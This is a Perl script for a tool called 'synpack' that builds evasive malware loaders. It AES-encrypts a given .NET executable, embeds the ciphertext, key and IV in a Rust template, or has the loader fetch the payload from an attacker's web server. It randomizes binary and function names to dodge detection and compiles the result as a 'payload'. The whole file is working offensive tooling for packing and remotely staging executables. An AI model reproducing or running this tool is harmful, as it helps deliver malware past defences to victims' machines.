use strict;
use warnings;
use File::stat;
use File::Copy;
use Term::ANSIColor qw(:constants);
use Bytes::Random::Secure qw(random_bytes);
use Crypt::Mode::CBC;
use Path::Tiny qw(path);


sub print_header {
    my $logo = <<'LOGO';
 ____                               _    
/ ___| _   _ _ __  _ __   __ _  ___| | __
\___ \| | | | '_ \| '_ \ / _` |/ __| |/ /
 ___) | |_| | | | | |_) | (_| | (__|   < 
|____/ \__, |_| |_| .__/ \__,_|\___|_|\_\
       |___/      |_|                    
LOGO
    print(BOLD, BRIGHT_BLUE, "$logo v0.1\n", RESET);
}

sub c_print {
    my ($stmt, $val, $color) = @_;

    $color = BRIGHT_BLUE if !$color;

    print(BOLD, $color, "$stmt", RESET);
    print("$val") if defined $val;
}

sub aes_encrypt {
    my $data = shift;

    my $key = random_bytes(16);
    my $iv  = random_bytes(16);

    c_print("[+] Reading " . length($data) . " bytes\n");

    my $cbc = Crypt::Mode::CBC->new('AES');

    my $ciphertext = $cbc->encrypt($data, $key, $iv);

    return $ciphertext, $key, $iv;
}

# for debug
sub hex_print_file {
    my $file = shift;

    my $buffer;

    my $stat = stat($file);
    my $filesize = $stat->size;
    print("$filesize\n");

    my $bytes_read = 0;
    while (read($file, $buffer, 1) != 0) {
        my $comma = ",";
        $comma = "\n" if ($bytes_read == $filesize - 1);
        printf("0x%02x$comma", ord($buffer));
        $bytes_read++;
    }
}

sub get_file_bytes {
    my $file = shift;

    my $buffer;

    my $stat = stat($file);
    my $filesize = $stat->size;

    read($file, $buffer, $filesize);

    return $buffer;
}

sub hex_format_data {
    my $data = shift;

    my $hex_str = join(',', map { sprintf("0x%02x", $_) } unpack('C*', $data));

    return $hex_str;
}

sub gen_random_string {
    my $str_len = shift;

    my @chars = ('a'..'z', '_');
    my $rand_str;
    foreach (1..$str_len) {
        $rand_str .= $chars[rand @chars];
    }
    return $rand_str;
}

sub purge_builds {
    unlink(glob("'.\\output\\*'"));
    system("cargo clean");
}



print_header();
my $usage = qq{
Usage: perl .\\synpack.pl <path or url to exe> <arguments>
(You can also omit the arguments and pass them directly to the binary)
};
my $filepath  = shift @ARGV or die $usage;
my $exe_args  = shift @ARGV or "";
my $encrypt   = 0;
my $web       = 0;
my $url       = "";

if (substr($filepath, 0, 4) eq "http") {
    $url = $filepath;
    c_print("[?] Do you want to encrypt the remote payload? (y/N) ");
    my $resp = <>;
    chomp $resp ;
    if (lc($resp) eq "y") {
        $encrypt = 1;
        c_print("[+] Enter filepath to exe without quotes: ");
        $filepath = <>;
        chomp $filepath ;
    }
}

c_print("[?] Do you want to change the output binary name? (default: random string) (y/N) ");
my $binary_name = gen_random_string(8);
my $resp = <>;
chomp $resp;
if (lc($resp) eq "y") {
    c_print("[+] Enter name without file extention: ");
    $binary_name = <>;
    chomp $binary_name;
}

c_print("[+] Updating project name to: ", "$binary_name\n", BRIGHT_GREEN);

copy("template.toml", "Cargo.toml") or die("Copy failed: $!\n");
my $cargo_conf = path(".\\Cargo.toml");
my $conf_replace = $cargo_conf->slurp_utf8;
$conf_replace =~ s/SYNPACK_NAME/$binary_name/g;
$cargo_conf->spew_utf8($conf_replace);


my $hex_data = "";
my $hex_key  = "";
my $hex_iv   = "";

if (!$url || ($url && $encrypt)) {

    c_print("[+] Opening: ", "$filepath\n");
    open(my $file, "<:raw", $filepath) or exit(c_print("[!] Cant open file! ", "$filepath\n", BRIGHT_RED));
    my $file_bytes = get_file_bytes($file);
    close($file);

    c_print("[+] Encrypting .NET executable\n", "", BRIGHT_GREEN);

    $encrypt = 1;
    my ($enc_data, $key, $iv) = aes_encrypt($file_bytes);
    
    if ($url) {
        my $outfile = gen_random_string(8);
        open(my $out, '>:raw', ".\\output\\$outfile") or exit(c_print("[!] Couldn't save encrypted payload!\n", "", BRIGHT_RED));
        syswrite $out, $enc_data;
        close($out);

        c_print("[+] Saved encrypted binary to: ", ".\\output\\$outfile\n", BRIGHT_GREEN);
        c_print("[!] URL will be updated with the new filename.\n", "", BRIGHT_RED);
        c_print("[!] *** ENSURE YOU UPLOAD THIS FILE TO YOUR WEB SERVER!! ***\n", "", BRIGHT_RED);
        $url =~ s/\/([^\/]+)$/\/$outfile/;
    }

    $hex_data = hex_format_data($enc_data);
    $hex_key  = hex_format_data($key);
    $hex_iv   = hex_format_data($iv);
}

c_print("[+] Copying template.rs to src/main.rs\n");

copy("template.rs", "src\\main.rs") or die("Copy failed: $!\n");

c_print("[+] Updating main.rs placeholders with payload data\n", "", BRIGHT_GREEN);

my $args = "";
$args = "String::from(\"$exe_args\")" if $exe_args;

my $template = path(".\\src\\main.rs");
my $replace = $template->slurp_utf8;

$replace =~ s/SYNPACK_KEY/$hex_key/g;
$replace =~ s/SYNPACK_IV/$hex_iv/g;
$replace =~ s/SYNPACK_DATA/$hex_data/g if !$url;
$replace =~ s/SYNPACK_ARGS/$args/g;

if (!$encrypt) {
    $replace =~ s/\/\/AES_START/\/*/g;
    $replace =~ s/\/\/AES_END/*\//g;
    $replace =~ s/decrypt_aes\(&mut bin_data\);//g;
}

my $random_func_name = gen_random_string(12);
$replace =~ s/decrypt_aes/$random_func_name/g if $encrypt;

if ($url) {
    $replace =~ s/SYNPACK_URL/$url/g;
    $replace =~ s/vec\!\[SYNPACK_DATA\];/get_data().await;/g;

    $random_func_name = gen_random_string(12);
    $replace =~ s/get_data/$random_func_name/g;
} else {
    $replace =~ s/\/\/WEB_START/\/*/g;
    $replace =~ s/\/\/WEB_END/*\//g;
}

$template->spew_utf8($replace);
c_print("[?] Would you like to purge old builds? (Y/n) ");
$resp = <>;
chomp $resp;
purge_builds() if lc($resp) eq "y";

c_print("[+] Compiling, this could take a while...\n");

my $exepath = ".\\target\\release\\$binary_name.exe";
unlink($exepath) if -e $exepath;

system("cargo build --release");

c_print("[+] Done! Payload located at: ", "$exepath\n", BRIGHT_GREEN) if -e $exepath;
c_print("[+] Payload will be downloaded from: ", "$url\n", BRIGHT_BLUE) if -e $exepath;